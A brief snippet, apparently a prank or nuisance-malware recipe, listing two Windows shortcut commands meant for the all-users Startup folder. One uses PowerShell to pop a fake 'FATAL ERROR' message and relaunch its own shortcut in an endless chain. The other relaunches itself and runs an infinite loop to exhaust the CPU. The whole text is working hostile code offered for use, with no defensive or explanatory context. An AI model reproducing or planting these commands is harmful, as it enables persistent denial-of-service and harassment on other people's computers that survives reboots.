**1.LNK generates error messages**
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-Type -Assembly PresentationFramework;[Windows.MessageBox]::Show('An error has occurred.','FATAL ERROR','0','48');ii C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\1.lnk

**2.LNK drains CPU**
powershell ii C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\2.lnk; while($true){$result=1+1}
